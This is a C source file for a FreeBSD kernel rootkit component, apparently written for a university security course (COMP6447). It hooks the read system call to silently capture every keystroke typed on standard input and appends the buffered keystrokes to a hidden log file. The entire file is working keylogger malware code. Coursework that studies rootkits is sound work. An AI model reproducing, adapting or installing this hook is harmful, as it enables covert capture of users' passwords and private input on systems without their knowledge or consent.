/*
 * Trivial
 * COMP6447 19T2 Rootkit
 * Joshua Kwong & Hogan Richardson
 *
 * read system call hook.
 * Logs all keystrokes to LOGPATH
 *
 */

#include "trivial.h"

int count = 0;
char logger[LOGBUFLEN];

/* FILE WRITE FUNCTIONS */
static int 
file_open(struct thread * td, int *fd, char * path)
{
	int error;
	error = kern_openat(td, 3, path, UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);

	if (!error) {
		*fd = td->td_retval[0];
	} 

	return error;
}

static int 
file_close(struct thread * td, int fd)
{
	if (fd) {
		struct close_args fdtmp;
		fdtmp.fd = fd;
		return kern_close(td, fd);//&fdtmp);
	} 

	return 0;
}

static int
file_write(struct thread * td, int fd, char * buf, u_int len)
{
	struct uio auio;
	struct iovec aiov;
	int err;

	bzero(&aiov, sizeof(aiov));
	bzero(&auio, sizeof(auio));

	aiov.iov_base = buf;
	aiov.iov_len = len;

	auio.uio_iov = &aiov;
	auio.uio_offset = 0;
	auio.uio_segflg = UIO_SYSSPACE;
	auio.uio_rw = UIO_WRITE;
	auio.uio_iovcnt = 1;
	auio.uio_resid = len;

	auio.uio_td = td;

	err = kern_writev(td, fd, &auio);

	return err;
}
/* 
 * log_out
 * Write the key logs to a file
 */
static int
log_out (struct thread *td)
{
	int fd = 0;
	int err = 0;
	err = file_open(td, &fd, LOGPATH);
	if (err) 
		return err;
	
	err = file_write(td, fd, logger, LOGBUFLEN);
	if (err) 
		return err;

	err = file_close(td, fd);

	return err;
}

/*
 * READ SYSCALL HOOK
 * Logs all keystrokes from stdin.
 * Note: This hook does not take into account special characters, such as
 * Tab, Backspace, and so on.
 */
int
read_hook(struct thread *td, void *syscall_args)
{
	struct read_args /* {
		int fd;
		void *buf;
		size_t nbyte;
	} */ *uap;
	uap = (struct read_args *)syscall_args;

	int error;
	int done;
	
	error = read(td, syscall_args);

	if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
		return(error);

	/* Save Keystrokes */
	if (count < LOGBUFLEN)  {
		copyinstr(uap->buf, &logger[count], 1, &done);
		count++;

	} else {
		// Store the buffered keylog data
		log_out(td);
		// Reset
		count = 0;
	}

	return(error);
}
